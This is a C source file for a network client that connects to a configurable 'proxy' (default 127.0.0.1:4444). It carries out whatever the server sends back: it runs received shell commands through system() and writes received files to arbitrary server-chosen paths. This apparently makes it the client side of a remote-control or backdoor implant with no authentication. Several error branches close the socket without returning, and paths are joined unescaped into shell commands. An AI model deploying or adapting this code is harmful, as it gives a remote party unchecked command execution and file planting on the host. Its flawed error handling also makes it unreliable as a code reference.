#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <libgen.h>  // for dirname()
#include <sys/stat.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include "headers/process_info.h"
#include "headers/proxy.h"

#ifndef PROXY_IP
#define PROXY_IP "127.0.0.1"  // Proxy address
#endif

#ifndef PROXY_PORT
#define PROXY_PORT 4444  // Proxy port
#endif


void create_directory_if_needed(const char *filepath) {
    char path_copy[1024];
    strncpy(path_copy, filepath, sizeof(path_copy));
    path_copy[sizeof(path_copy) - 1] = '\0';

    // Get the directory part of the path
    char dir_path[1024];
    strncpy(dir_path, dirname(path_copy), sizeof(dir_path));
    dir_path[sizeof(dir_path) - 1] = '\0';

    char tmp_path[1024] = "";
    char *token;
    const char delim[2] = "/";

    // Handle absolute paths
    if (filepath[0] == '/') {
        strcat(tmp_path, "/");
    }

    token = strtok(dir_path, delim);
    while (token != NULL) {
        strcat(tmp_path, token);
        strcat(tmp_path, "/");

        struct stat st = {0};
        if (stat(tmp_path, &st) == -1) {
            if (mkdir(tmp_path, 0755) == -1 && errno != EEXIST) {
                perror("mkdir");
                return;
            }
        }

        token = strtok(NULL, delim);
    }
}

int recv_all(int sock, void *buffer, size_t length) {
    size_t total = 0;
    while (total < length) {
        int bytes = recv(sock, (char *)buffer + total, length - total, 0);
        if (bytes <= 0) return -1;
        total += bytes;
    }
    return 0;
}

void send_request_to_proxy(const char *request_message) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    struct sockaddr_in serv_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(PROXY_PORT)
    };
    inet_pton(AF_INET, PROXY_IP, &serv_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Connection to proxy failed");
        close(sock);
    }

    send(sock, request_message, strlen(request_message), 0);

    // === Receive mode ===
    uint8_t mode;
    if (recv_all(sock, &mode, 1) != 0) {
        fprintf(stderr, "Invalid or incomplete response: missing mode\n");
        close(sock);
    }

    // === Receive path length ===
    uint32_t path_len;
    if (recv_all(sock, &path_len, sizeof(path_len)) != 0) {
        fprintf(stderr, "Invalid or incomplete response: missing path length\n");
        close(sock);
    }
    path_len = ntohl(path_len);

    if (path_len == 0 || path_len >= 1024) {
        fprintf(stderr, "Invalid path length: %u\n", path_len);
        close(sock);
    }

    // === Receive path ===
    char path[1024] = {0};
    if (recv_all(sock, path, path_len) != 0) {
        fprintf(stderr, "Failed to receive full path\n");
        close(sock);
    }
    path[path_len] = '\0';

    if (mode == 0x01) {
        // === Command mode ===
        uint64_t cmd_len;
        if (recv_all(sock, &cmd_len, sizeof(cmd_len)) != 0) {
            fprintf(stderr, "Missing command length\n");
            close(sock);
        }
        cmd_len = be64toh(cmd_len);

        if (cmd_len == 0 || cmd_len >= 8192) {
            fprintf(stderr, "Invalid command length: %lu\n", cmd_len);
            close(sock);
        }

        char command[8192 + 1];
        if (recv_all(sock, command, cmd_len) != 0) {
            fprintf(stderr, "Failed to receive full command\n");
            close(sock);
        }
        command[cmd_len] = '\0';

        printf("Executing command: %s %s\n", command, path);
        char full_cmd[10240];
        snprintf(full_cmd, sizeof(full_cmd), "%s %s", command, path);
        int ret = system(full_cmd);
        if (ret == -1) perror("Command execution failed");
        else printf("Exited with code %d\n", WEXITSTATUS(ret));

    } else if (mode == 0x02) {
        // === File mode ===
        uint64_t file_size;
        if (recv_all(sock, &file_size, sizeof(file_size)) != 0) {
            fprintf(stderr, "Missing file size\n");
            close(sock);
        }
        file_size = be64toh(file_size);

        printf("Receiving file: %s (%lu bytes)\n", path, file_size);
        create_directory_if_needed(path);
        FILE *f = fopen(path, "wb");
        if (!f) {
            perror("Failed to open file");
            close(sock);
        }

        char buffer[4096];
        uint64_t remaining = file_size;
        while (remaining > 0) {
            int chunk = recv(sock, buffer, remaining > sizeof(buffer) ? sizeof(buffer) : remaining, 0);
            if (chunk <= 0) break;
            fwrite(buffer, 1, chunk, f);
            remaining -= chunk;
        }
        fclose(f);
        printf("Saved to %s\n", path);

    } else {
        fprintf(stderr, "Unknown mode: %u\n", mode);
    }

    close(sock);
}
